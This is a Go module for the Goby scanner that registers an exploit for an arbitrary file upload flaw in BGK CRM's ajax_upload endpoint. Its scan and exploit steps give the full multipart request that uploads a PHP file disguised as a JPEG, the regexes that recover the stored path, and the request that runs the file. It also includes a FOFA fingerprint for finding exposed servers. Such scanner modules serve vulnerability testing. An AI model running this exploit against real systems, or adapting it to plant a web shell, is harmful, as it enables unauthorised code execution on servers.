package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "bgk Crm ajax_upload Api file upload vulnerability",
    "Description": "<p><a href=\"http://www.example.com\"></a>BGK CRM customer management system is a professional customer management system, which satisfies the company's all-round sales follow-up, intelligent service management, efficient communication and collaboration, and graphical data analysis. . There is a file upload vulnerability in this system, and attackers can use this vulnerability to gain server permissions by uploading php files.</p>",
    "Impact": "<p>There is a file upload vulnerability in this system, and attackers can use this vulnerability to gain server permissions by uploading php files.</p>",
    "Recommendation": "<p>The latest version has fixed the vulnerability，Upgrade to the latest version： https://www.bgk100.com</p>",
    "Product": "bgkcrm",
    "VulType": [
        "File Upload"
    ],
    "Tags": [
        "File Upload"
    ],
    "Translation": {
        "CN": {
            "Name": "帮管客 CRM ajax_upload 接口任意文件上传漏洞",
            "Product": "帮管客CRM",
            "Description": "<p>帮管客CRM客户管理系统是一款专业的客户管理系统，满足企业全方位的销售跟进、智能化服务管理、高效的沟通协同、图表化数据分析帮管客颠覆传统，重新定义企业管理系统。该系统存在文件上传漏洞，攻击者可利用该漏洞通过上传php文件获取服务器权限。<br></p>",
            "Recommendation": "<p>最新版已修复该漏洞，升级至最新版本：<a href=\"https://www.bgk100.com\">https://www.bgk100.com</a></p>",
            "Impact": "<p>攻击者可以通过文件上传漏洞获取服务器权限。</p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "bgk Crm ajax_upload Api file upload vulnerability",
            "Product": "bgkcrm",
            "Description": "<p><a href=\"http://www.example.com\" target=\"_blank\"></a>BGK CRM customer management system is a professional customer management system, which satisfies the company's all-round sales follow-up, intelligent service management, efficient communication and collaboration, and graphical data analysis. . There is a file upload vulnerability in this system, and attackers can use this vulnerability to gain server permissions by uploading php files.</p>",
            "Recommendation": "<p><span style=\"color: var(--primaryFont-color);\"><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">The latest version has fixed the vulnerability，</span>Upgrade to the latest version： <a href=\"https://www.bgk100.com\">https://www.bgk100.com</a><a href=\"https://www.bgk100.com\"></a></span><br></p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">There is a file upload vulnerability in this system, and attackers can use this vulnerability to gain server permissions by uploading php files.</span><br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "FofaQuery": "body=\"/themes/default/css/llq.css\"",
    "GobyQuery": "body=\"/themes/default/css/llq.css\"",
    "Author": "black@blackhat.net",
    "Homepage": "https://www.bgk100.com",
    "DisclosureDate": "2022-03-24",
    "References": [
        "https://fofa.so/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.5",
    "CVEIDs": [],
    "CNVD": [
        "CNVD-2020-69433"
    ],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/index.php/upload/ajax_upload",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryv1WbOn5o"
                },
                "data_type": "text",
                "data": "------WebKitFormBoundaryv1WbOn5o\nContent-Disposition: form-data; name=\"file\"; filename=\"1.php\"\nContent-Type: image/jpeg\n\n<?php\nphpinfo();unlink(__FILE__);\n------WebKitFormBoundaryv1WbOn5o--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "file_name",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "ttt|lastbody|regex|uploads\\\\\\/(.*?)\\\\\\/20",
                "file|lastbody|regex|\"file_name\":\"(.*?)\",\"file_type\"",
                "url|lastbody|text|data/uploads/{{{ttt}}}/{{{file}}}"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/{{{url}}}",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "phpinfo",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/index.php/upload/ajax_upload",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryv1WbOn5o"
                },
                "data_type": "text",
                "data": "------WebKitFormBoundaryv1WbOn5o\nContent-Disposition: form-data; name=\"file\"; filename=\"1.php\"\nContent-Type: image/jpeg\n\n<?php\nphpinfo();unlink(__FILE__);\n------WebKitFormBoundaryv1WbOn5o--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "file_name",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "ttt|lastbody|regex|uploads\\\\\\/(.*?)\\\\\\/20",
                "file|lastbody|regex|\"file_name\":\"(.*?)\",\"file_type\"",
                "url|lastbody|text|data/uploads/{{{ttt}}}/{{{file}}}"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/{{{url}}}",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "phpinfo",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10358"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
